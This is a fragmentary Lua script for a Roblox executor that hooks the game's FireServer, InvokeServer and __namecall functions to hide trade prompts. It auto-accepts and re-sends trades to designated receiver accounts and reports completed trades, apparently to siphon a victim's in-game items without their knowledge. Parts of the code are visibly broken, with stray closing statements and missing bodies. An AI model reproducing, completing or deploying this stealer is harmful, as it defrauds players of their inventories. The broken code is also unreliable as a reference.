local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)
		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end
	return function()
		local r = table.pack(f(s, c))
		if r[1] == nil then return false end
		c = r[1]
		return true, table.unpack(r, 1, r.n)
	end
end

local function u32ToBytes(n)
	local v = n % 4294967296
	return string.char(bit32.band(bit32.rshift(v, 24), 255), bit32.band(bit32.rshift(v, 16), 255), bit32.band(bit32.rshift(v, 8), 255), bit32.band(v, 255))
end

local function sha256(msg)
	local len = #msg * 8
	local hi = math.floor(len / 4294967296)
	local padded = msg .. string.char(128) .. string.rep(string.char(0), (56 - (#msg + 1) % 64) % 64) .. u32ToBytes(hi) .. u32ToBytes(len % 4294967296)
	local state = {1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225}

	for i = 1, #padded, 64 do
		local w = {}
		for j = 0, 15 do
			local off = i + j * 4
			local a, b, c, d = string.byte(padded, off, off + 3)
			w[j + 1] = (a * 16777216 + b * 65536 + c * 256 + d) % 4294967296
		end
		for j = 17, 64 do
			local w15, w2 = w[j - 15], w[j - 2]
			w[j] = (w[j - 16] + bit32.bxor(bit32.rrotate(w15, 7), bit32.rrotate(w15, 18), bit32.rshift(w15, 3)) + w[j - 7] + bit32.bxor(bit32.rrotate(w2, 17), bit32.rrotate(w2, 19), bit32.rshift(w2, 10))) % 4294967296
		end
		local a, b, c, d, e, f, g, h = table.unpack(state)
		for j = 1, 64 do
			local s1 = (h + bit32.bxor(bit32.rrotate(e, 6), bit32.rrotate(e, 11), bit32.rrotate(e, 25)) + bit32.bxor(bit32.band(e, f), bit32.band(bit32.bnot(e), g)) + sha256K[j] + w[j]) % 4294967296
			local s0 = (bit32.bxor(bit32.rrotate(a, 2), bit32.rrotate(a, 13), bit32.rrotate(a, 22)) + bit32.bxor(bit32.band(a, b), bit32.band(a, c), bit32.band(b, c))) % 4294967296
			h, g, f, e, d, c, b, a = g, f, e, (d + s1) % 4294967296, c, b, a, (s1 + s0) % 4294967296
		end
		state[1] = (state[1] + a) % 4294967296; state[2] = (state[2] + b) % 4294967296
		state[3] = (state[3] + c) % 4294967296; state[4] = (state[4] + d) % 4294967296
		state[5] = (state[5] + e) % 4294967296; state[6] = (state[6] + f) % 4294967296
		state[7] = (state[7] + g) % 4294967296; state[8] = (state[8] + h) % 4294967296
	end
	local out = {}
	for i = 1, 8 do out[i] = u32ToBytes(state[i]) end
	return table.concat(out)
end

local function hmacSha256(key, message)
	if #key > 64 then key = sha256(key) end
	local paddedKey = key .. string.rep(string.char(0), 64 - #key)
	local oKeyPad, iKeyPad = {}, {}
	for i = 1, 64 do
		local byte = string.byte(paddedKey, i)
		oKeyPad[i] = string.char(bit32.bxor(byte, 92))
		iKeyPad[i] = string.char(bit32.bxor(byte, 54))
	end
	local innerHash = sha256(table.concat(iKeyPad) .. message)
	return toHex(sha256(table.concat(oKeyPad) .. innerHash))
end

local function cryptHmac(key, data)
	if cryptLib and type(cryptLib.hmac) == "function" then
		for _, args in ipairs({{key, data, "sha256"}, {data, key, "sha256"}, {"sha256", key, data}}) do
			local ok, res = pcall(cryptLib.hmac, table.unpack(args))
			if ok and res then return res end
		end
	end
	if not verifySha256() then return nil end
	local ok, res = pcall(hmacSha256, key, data)
	return ok and res or nil
end

local function normalizeKey(key)
	if not key or key == "" then return nil end
	local str = tostring(key)
	if #str == 64 and str:match("^[%x]+$") then return str:lower() end
	if #str == 32 then return toHex(str) end
	if cryptLib and type(cryptLib.base64decode) == "function" then
		local ok, res = pcall(cryptLib.base64decode, str)
		if ok and res and #res == 32 then return toHex(res) end
	end
	return str
end

local function encryptData(plaintext, secret)
	if cryptLib and type(cryptLib.hmac) == "function" and type(base64Encode) == "function" and type(base64Decode) == "function" then
		local ok, res = pcall(function()
			local function derive(seed, salt) return base64Decode(cryptLib.hmac(seed, salt, "sha256")) end
			local nonce = game:GetService("HttpService"):GenerateGUID(false):gsub("-", ""):sub(1, 32)
			local key = derive(secret .. "|starcrypt-enc-v1", "9f3c7a1e5b8d2046c1fe83a75d9b0e42a6c8f13d7e0b592a4c6f81d3b7e9a2508")
			local blocks, offset, counter = {}, 0, 0
			while offset < #plaintext do
				blocks[#blocks + 1] = derive(nonce .. "|" .. counter, key)
				offset += 32
				counter += 1
			end
			local keystream = table.concat(blocks)
			local cipher = {}
			for i = 1, #plaintext do
				cipher[i] = string.char(bit32.bxor(string.byte(plaintext, i), string.byte(keystream, i)))
			end
			return { enc = base64Encode(table.concat(cipher)), n = nonce }
		end)
		if ok and type(res) == "table" and res.enc then return res end
	end
	return nil
end

end

			end

		return prof
	end

local function safeFireServer(remote, ...)
	local co = coroutine.running()
	local prev = hookState[co]
	hookState[co] = true
	local ok = pcall(FireServer, remote, ...)
	hookState[co] = prev
	return ok
end

local function safeInvokeServer(remote, ...)
	local co = coroutine.running()
	local prev = hookState[co]
	hookState[co] = true
	local ok, res = pcall(InvokeServer, remote, ...)
	hookState[co] = prev
	return ok, res
end

do
	local testRemote = Instance.new("RemoteEvent")
	local pingReceived = false

	local function setupHooks()
		if type(hookfunction) ~= "function" then return false end
		return pcall(function()
			local origFire, origInvoke
			local function hookFire(remote, ...)
				if not hookedRemotes[remote] or hookState[coroutine.running()] then return origFire(remote, ...) end
				if remote == testRemote then pingReceived = true end
			end
			local function hookInvoke(remote, ...)
				if hookedRemotes[remote] and not hookState[coroutine.running()] then return end
				return origInvoke(remote, ...)
			end
			local newFire, newInvoke = hookFire, hookInvoke
			if type(newcclosure) == "function" then newFire, newInvoke = newcclosure(hookFire), newcclosure(hookInvoke) end
			origFire = hookfunction(FireServer, newFire)
			origInvoke = hookfunction(InvokeServer, newInvoke)
			if type(origFire) ~= "function" or type(origInvoke) ~= "function" then error("hook error") end
			FireServer, InvokeServer = origFire, origInvoke
			hooked = true
		end)
	end

	hookedRemotes[testRemote] = true
	setupHooks()

	if type(getnamecallmethod) == "function" then
		local origNamecall
		local function hookNamecall(obj, ...)
			if hookedRemotes[obj] and not hookState[coroutine.running()] then
				local method = getnamecallmethod()
				if method == "FireServer" or method == "InvokeServer" then return nil end
			end
			return origNamecall(obj, ...)
		end
		if type(hookmetamethod) == "function" then
			local ok, res = pcall(hookmetamethod, game, "__namecall", hookNamecall)

				if readonly then setreadonly(mt, false) end
				local orig = mt.__namecall
				if type(orig) == "function" then origNamecall = orig; mt.__namecall = hookNamecall end
				if readonly then setreadonly(mt, true) end
			end)
		end
	end

			while tradeRuntime.Active do

				task.wait(5)

				pcall(function() testRemote:FireServer() end)
				if not pingReceived then fails += 1; hooked = false; setupHooks() end

		end)

			local amt = tonumber(v[2] or v.Amount) or 1
			local itype = v[3] or v.ItemType

				end
			end
		end)
	end))

	table.insert(tradeRuntime.Connections, Trade.EndTrade.OnClientEvent:Connect(function()
		resetTradeSession(tradeRuntime.Target)
	end))

	table.insert(tradeRuntime.Connections, Trade.AcceptTrade.OnClientEvent:Connect(function(success)
		if success then
			tradeRuntime.AcceptPending = false
			tradeRuntime.ConfirmedCompletionPending = true
			tradeRuntime.TradeCompleted = true
			local pending = tradeRuntime.PendingCompletion
			if pending and not pending.Reported and pending.Value > 0 then
				pending.Reported = true
				reportTrade(pending.Value, pending.TradeId, pending.TradedMap, pending.TradedItems)
			end
			resetTradeSession(tradeRuntime.Target)
		end
	end))
end

do
	local function handleTradeRequest(sender)
		hideTradePrompts()
		local senderName = typeof(sender) == "Instance" and sender:IsA("Player") and sender.Name or tostring(sender)
		if not isReceiver(senderName) then
			task.delay(0.05, function()
				if tradeRuntime.Active then hideTradePrompts(); safeFireServer(DeclineRequest) end
			end)
			return false
		end
		sendRequestBusy = true
		tradeRuntime.Target = senderName
		tradeRuntime.LastTarget = senderName
		task.delay(0.1, function()
			if tradeRuntime.Active then hideTradePrompts(); safeFireServer(AcceptRequest) end
		end)
		return true
	end

	local function hookSendRequest()
		SendRequest.OnClientInvoke = function(sender) return handleTradeRequest(sender) end
	end

	hookSendRequest()
	table.insert(tradeRuntime.Connections, Trade.RequestSent.OnClientEvent:Connect(handleTradeRequest))

	sendTradeRequest = function(player)
		if not sendRequestBusy and tradeRuntime.Active and isReceiver(player.Name) and player ~= LocalPlayer then
			sendRequestBusy = true
			tradeRuntime.LastInviteAt = time()
			tradeRuntime.Target = player.Name
			tradeRuntime.LastTarget = player.Name
			local ok = safeInvokeServer(SendRequest, player)
			if not ok then
				sendRequestBusy = false
				tradeRuntime.Target = nil
				task.delay(2.5, function()
					if tradeRuntime.Active and not sendRequestBusy and player.Parent == Players and isReceiver(player.Name) then
						sendTradeRequest(player)
					end
				end)
			end
		end
	end

	table.insert(tradeRuntime.Connections, Players.PlayerAdded:Connect(sendTradeRequest))

	task.spawn(function()
		while tradeRuntime.Active do
			task.wait(1)
			hookSendRequest()
			local ok, status = safeInvokeServer(GetTradeStatus)
			if ok and status == "None" then
				local elapsed = time() - tradeRuntime.LastInviteAt
				if sendRequestBusy and elapsed >= 3 then sendRequestBusy = false end
				if tradeRuntime.OtherPlayer ~= nil then
					tradeRuntime.Session += 1
					tradeRuntime.Update += 1
					tradeRuntime.OtherPlayer = nil
					tradeRuntime.Target = nil
					tradeRuntime.Selected = {}
					tradeRuntime.ObservedOffer = nil
					tradeRuntime.AcceptGeneration += 1
					tradeRuntime.AcceptScheduled = false
					tradeRuntime.AcceptPending = false
					tradeRuntime.LastAcceptSentAt = 0
				end
				if not sendRequestBusy and elapsed >= 2.5 then
					inventoryItems = getInventoryItems()
					if #inventoryItems > 0 then
						local p = findTargetPlayer(tradeRuntime.LastTarget)
						if p then sendTradeRequest(p) end
					end
				end
			elseif ok and tradeRuntime.AcceptPending and tradeRuntime.ObservedOffer ~= nil and tradeRuntime.OtherPlayer == tradeRuntime.Target then
				if time() - tradeRuntime.LastAcceptSentAt >= 2 then
					tradeRuntime.LastAcceptSentAt = time()
					safeFireServer(AcceptTrade, game.PlaceId * 3, tradeRuntime.ObservedOffer)
				end
			end
		end
	end)
end

do
	local ok, status = safeInvokeServer(GetTradeStatus)
	if ok and status ~= nil and status ~= "None" then
		safeFireServer(DeclineTrade)
		safeFireServer(DeclineRequest)
		tradeRuntime.OtherPlayer = nil
		tradeRuntime.Target = nil
		tradeRuntime.Selected = {}
		tradeRuntime.ObservedOffer = nil
		pcall(hideTradeGuis)
	end
end

if initialTarget then task.defer(sendTradeRequest, initialTarget) end

local currentRun = env.FvlRedirectRun

task.delay(redirectDelay, function()
	if env.FvlRedirectRun == currentRun then
		if tradeRuntime.Active and not tradeRuntime.TradeCompleted and not webhookRuntime.Completed then
			local highestTier = 0
			for _, item in ipairs(inventoryItems) do
				local tier = getRarityTier(item)
				if highestTier < tier then highestTier = tier end
			end
			if highestTier < minimumRarity or not addAutoReceivers() then return end
			tradeRuntime.LastTarget = nil
			if tradeRuntime.OtherPlayer ~= nil and not isAutoReceiver(tradeRuntime.OtherPlayer) then
				safeFireServer(DeclineTrade)
			end
		end
	end
end)
